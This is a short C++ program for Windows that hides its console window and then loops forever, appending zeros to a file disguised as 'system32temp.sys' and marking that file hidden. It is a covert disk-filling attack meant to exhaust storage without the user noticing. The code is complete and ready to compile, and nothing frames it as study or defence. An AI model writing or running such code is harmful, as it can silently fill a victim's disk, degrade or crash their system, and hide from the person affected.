#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <direct.h>
using namespace std;
void openhihddenconsloe()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}
///fsutil file createnew C:\aa.txx 1024000

int main()
{
	openhihddenconsloe();
	fstream f;
	f.open("system32temp.sys",ios::out|ios::app);

	cout<<"f:"<<f<<endl;
while(1)
	{
	f<<"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	
	//cout<<"system32temp.sys";
	SetFileAttributes("system32temp.sys",FILE_ATTRIBUTE_HIDDEN);

	}
	
	
	
	system("pause");
	




}
